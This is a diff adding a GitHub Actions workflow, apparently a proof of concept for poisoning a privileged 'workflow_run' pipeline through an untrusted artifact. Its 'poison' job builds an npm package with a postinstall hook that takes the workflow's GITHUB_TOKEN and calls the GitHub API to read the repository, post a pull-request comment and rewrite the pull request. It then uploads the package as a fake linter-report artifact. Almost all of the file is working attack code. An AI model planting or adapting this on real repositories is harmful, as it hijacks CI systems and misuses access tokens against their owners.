@@ -1,0 +1,55 @@
+name: ADP Target PR validation
+on:
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  poison:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build attacker-controlled linter-report artifact
+        run: |
+          mkdir -p out pkg
+          cat > pkg/package.json <<'JSON'
+          {"name":"lint-poc","version":"1.0.0","scripts":{"postinstall":"node post.js"}}
+          JSON
+          cat > pkg/post.js <<'JS'
+          const fs = require('fs');
+          (async () => {
+            const repo = process.env.GITHUB_REPOSITORY || '';
+            const token = process.env.GITHUB_TOKEN || '';
+            let pr = '0';
+            try { pr = fs.readFileSync('./pr-number.txt','utf8').trim(); } catch (e) {}
+            const out = ['ADP_ARTIFACT_RCE_PROVEN', 'token=' + (token ? 'yes' : 'no'), 'repo=' + repo, 'pr=' + pr];
+            const call = async (method, url, body) => {
+              const r = await fetch('https://api.github.com' + url, {
+                method,
+                headers: { Authorization: 'Bearer ' + token, Accept: 'application/vnd.github+json', 'User-Agent': 'poc', 'Content-Type': 'application/json' },
+                body: body ? JSON.stringify(body) : undefined
+              });
+              return r.status;
+            };
+            try {
+              out.push('repo_read=' + await call('GET', '/repos/' + repo));
+              out.push('comment_status=' + await call('POST', '/repos/' + repo + '/issues/' + pr + '/comments', { body: 'PoC: privileged workflow_run RCE via untrusted artifact.' }));
+              out.push('patch_pr_status=' + await call('PATCH', '/repos/' + repo + '/pulls/' + pr, { body: 'PoC marker: privileged workflow_run RCE in PDFtoMark test repo.' }));
+            } catch (e) { out.push('ERR=' + e.message); }
+            fs.writeFileSync('/tmp/ADP_ARTIFACT_RCE', out.join('\n'));
+            console.log(out.join('\n'));
+          })();
+          JS
+          (cd pkg && npm pack --silent >/dev/null)
+          mv pkg/lint-poc-1.0.0.tgz out/
+          cat > out/package.json <<'JSON'
+          {"name":"report-consumer","version":"1.0.0","private":true,"dependencies":{"lint-poc":"file:./lint-poc-1.0.0.tgz"}}
+          JSON
+          echo "attacker-controlled report" > out/linter-report.txt
+          echo "${{ github.event.pull_request.number }}" > out/pr-number.txt
+          ls -la out
+      - uses: actions/upload-artifact@v7
+        with:
+          name: linter-report
+          path: out/
+          if-no-files-found: ignore
